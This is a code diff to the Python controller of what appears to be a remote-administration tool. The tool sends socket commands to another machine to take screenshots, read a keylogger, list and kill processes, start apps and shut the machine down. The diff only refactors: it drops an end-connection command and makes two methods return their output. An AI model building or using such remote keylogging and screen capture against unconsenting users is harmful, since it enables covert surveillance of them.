@@ -3,7 +3,6 @@ import os
 import time
 
 # Commands
-CMD_END_CONNECTION = 'end_connection'
 CMD_SHUTDOWN = 'shutdown'
 CMD_TAKE_SCREENSHOT = 'screenshot'
 CMD_KEY_LOGGER = 'keylogger'
@@ -53,7 +52,7 @@ class Client:
           pass
       except ConnectionAbortedError:
           pass
-
+  # Command Line Interface
   def run(self):
     while True:
       print('''Commands: 
@@ -68,7 +67,6 @@ class Client:
       9: Print key logger
       10: Shutdown
       0: Exit''')
-      
       cmd = input('Enter command: ')
       try:
         if cmd == '1':
@@ -97,8 +95,6 @@ class Client:
           break
         elif cmd == '0':
           print("[EXIT] Exiting...")
-          # End connection
-          self.end_connection()
           break
       except ConnectionResetError:
         print("[ERROR] Connection reset")
@@ -147,7 +143,7 @@ class Client:
       else:
         processes += data.decode()
         
-    print(processes)
+    return processes
       
   def kill_process(self, pid):
     self.socket.send(CMD_KILL_PROCESS.encode())
@@ -163,15 +159,12 @@ class Client:
         break
       else:
         apps += data.decode()
-    print(apps)
+    return apps
 
   def start_app(self, app_name):
     self.socket.send(CMD_START_APP.encode())
     time.sleep(0.01)
     self.socket.send(app_name.encode())
-
-  def end_connection(self):
-    self.socket.send(CMD_END_CONNECTION.encode())
     
 
 
